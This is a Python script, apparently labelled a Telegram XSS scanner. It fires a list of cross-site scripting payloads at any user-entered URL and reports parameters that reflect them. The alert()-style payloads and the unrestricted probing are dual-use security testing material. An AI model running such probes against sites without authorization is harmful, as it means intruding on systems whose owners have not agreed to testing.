#!/usr/bin/env python3
"""
Telegram XSS Vulnerability Scanner
Educational and authorized testing only
"""
import re
import requests
from urllib.parse import urljoin, urlparse
from datetime import datetime

class XSSScanner:
    def __init__(self):
        self.payloads = self.load_payloads()
        self.vulnerabilities = []
        
    def load_payloads(self):
        """Load XSS test payloads"""
        return [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "'-alert('XSS')-'",
            "\"><script>alert('XSS')</script>",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<img src=\"x\" onerror=\"alert('XSS')\">",
        ]
    
    def scan_url(self, url, params=None):
        """Scan a URL for XSS vulnerabilities"""
        print(f"\n[*] Scanning: {url}")
        
        if params is None:
            params = self.extract_params(url)
        
        for param in params:
            for payload in self.payloads:
                if self.test_payload(url, param, payload):
                    vuln = {
                        'url': url,
                        'parameter': param,
                        'payload': payload,
                        'timestamp': datetime.now().isoformat()
                    }
                    self.vulnerabilities.append(vuln)
                    print(f"[!] VULNERABLE: {param} with payload: {payload[:50]}")
    
    def test_payload(self, url, param, payload):
        """Test a specific payload"""
        try:
            test_params = {param: payload}
            response = requests.get(url, params=test_params, timeout=5)
            
            # Check if payload is reflected in response
            if payload in response.text:
                return True
        except Exception as e:
            print(f"[!] Error testing {param}: {e}")
        
        return False
    
    def extract_params(self, url):
        """Extract parameters from URL"""
        from urllib.parse import parse_qs, urlparse
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        return list(params.keys()) if params else ['q', 'search', 'id', 'name']
    
    def generate_report(self, output_file='report.txt'):
        """Generate vulnerability report"""
        with open(output_file, 'w') as f:
            f.write("="*60 + "\n")
            f.write("XSS VULNERABILITY SCAN REPORT\n")
            f.write("="*60 + "\n\n")
            f.write(f"Scan Date: {datetime.now()}\n")
            f.write(f"Total Vulnerabilities Found: {len(self.vulnerabilities)}\n\n")
            
            for i, vuln in enumerate(self.vulnerabilities, 1):
                f.write(f"\n[{i}] Vulnerability Details:\n")
                f.write(f"URL: {vuln['url']}\n")
                f.write(f"Parameter: {vuln['parameter']}\n")
                f.write(f"Payload: {vuln['payload']}\n")
                f.write(f"Timestamp: {vuln['timestamp']}\n")
                f.write("-"*60 + "\n")
        
        print(f"\n[+] Report saved to: {output_file}")

def main():
    print("""
    ╔═══════════════════════════════════════════╗
    ║   Telegram XSS Vulnerability Scanner     ║
    ║   Educational & Authorized Use Only      ║
    ╚═══════════════════════════════════════════╝
    """)
    
    scanner = XSSScanner()
    
    target = input("\n[?] Enter target URL: ").strip()
    
    if not target:
        print("[!] No URL provided")
        return
    
    scanner.scan_url(target)
    
    if scanner.vulnerabilities:
        scanner.generate_report(f'reports/xss_report_{datetime.now().strftime("%Y%m%d_%H%M%S")}.txt')
    else:
        print("\n[+] No vulnerabilities found")

if __name__ == "__main__":
    main()
